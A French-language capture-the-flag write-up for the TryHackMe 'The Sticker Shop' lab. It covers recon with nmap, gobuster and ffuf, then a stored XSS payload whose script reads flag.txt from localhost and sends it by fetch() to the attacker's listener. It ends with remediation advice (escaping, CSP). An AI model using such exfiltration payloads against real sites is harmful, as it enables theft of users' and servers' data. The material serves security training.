# 📌 Write-Up : Machine The Sticker Shop - TryHackMe

## 📝 Informations générales
- **Nom de la machine** : The Sticker Shop
- **Plateforme** : TryHackMe
- **Catégorie** : Web Exploitation
- **Techniques utilisées** : Nmap, Gobuster, FFUF, XSS, Local File Read, Exfiltration de données

---

## 👀 1. Scan initial

Nous commençons par un scan de l'hôte avec **Nmap** pour identifier les services actifs :

```bash
sudo nmap -sV -Pn 10.10.216.136
```

📌 **Résultats** :
- Port 8080 ouvert (Serveur Web détecté)

Ensuite, nous effectuons un scan de répertoires avec **Gobuster** pour identifier les endpoints accessibles :

```bash
gobuster dir -u http://10.10.216.136:8080 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -b 403,404
```

📌 **Résultats** :
- `/submit_feedback` → Formulaire permettant de soumettre un feedback

Un test rapide avec **FFUF** pour voir s’il existe d'autres pages cachées :

```bash
ffuf -u http://10.10.216.136:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -fc 403,404
```

Résultat intéressant : la page **Submit Feedback** semble vulnérable.

---

## 🎭 2. Analyse de la page "Submit Feedback"

Nous interceptons la requête **POST** envoyée à `/submit_feedback` avec **Burp Suite** :

```
POST /submit_feedback HTTP/1.1
Host: 10.10.216.136:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

feedback=zeubiiii
```

📌 **Hypothèse** : Si la saisie est affichée sur la page sans filtrage, on peut tenter une **injection XSS**.

---

## 💀 3. Exploitation de la faille XSS

Nous testons une première payload XSS :

```html
"><script>alert('XSS')</script>
```

✅ **L'alerte s'affiche**, confirmant la vulnérabilité **XSS stocké**. Nous pouvons maintenant l’exploiter pour exfiltrer le fichier `flag.txt`.

---

## 🚀 4. Exploitation XSS → Local File Read

Nous injectons ce payload dans le formulaire :

```html
"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<ip_de_ta_machine>:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```

📌 **Ce que fait ce script :**
1. **Lit** le fichier `flag.txt` sur `127.0.0.1:8080`.
2. **Envoie** son contenu vers notre machine d'attaque sur `<ip_de_ta_machine>:8000`.

---

## 🏴‍☠️ 5. Exfiltration du flag

Nous mettons en place un **listener HTTP** pour capturer la requête contenant le flag :

```bash
python3 -m http.server 8000
```

Lorsque le script s'exécute, nous recevons la requête avec le flag :

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.24.95 - - [10/Feb/2025 15:54:43] "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b6
```

📌 **Flag capturé !** 🎉

---

## 🔒 6. Correctifs pour sécuriser l'application

Voici plusieurs solutions pour éviter cette vulnérabilité :

### ✅ 1. Échapper les entrées utilisateur
- Utiliser `htmlspecialchars()` en PHP :
  ```php
  echo htmlspecialchars($_POST['feedback'], ENT_QUOTES, 'UTF-8');
  ```

### ✅ 2. Mettre en place une Content Security Policy (CSP)
- Ajouter un en-tête HTTP **Content-Security-Policy** :
  ```
  Content-Security-Policy: default-src 'self'; script-src 'none'
  ```

### ✅ 3. Restreindre l'accès au fichier `flag.txt`
- Placer `flag.txt` hors du répertoire accessible au public (`/var/www/html`).
- Configurer le serveur pour bloquer l’accès à `127.0.0.1`.

---

## 🎯 **Conclusion**
- **Nmap → XSS stocké → Local File Read → Exfiltration du flag** 🚀
- **Exploitation réussie en utilisant un serveur HTTP pour capturer la requête.**
- **Solutions de sécurité proposées pour corriger la vulnérabilité.**

🎉 **Machine compromise avec succès !** 🏴‍☠️🔥
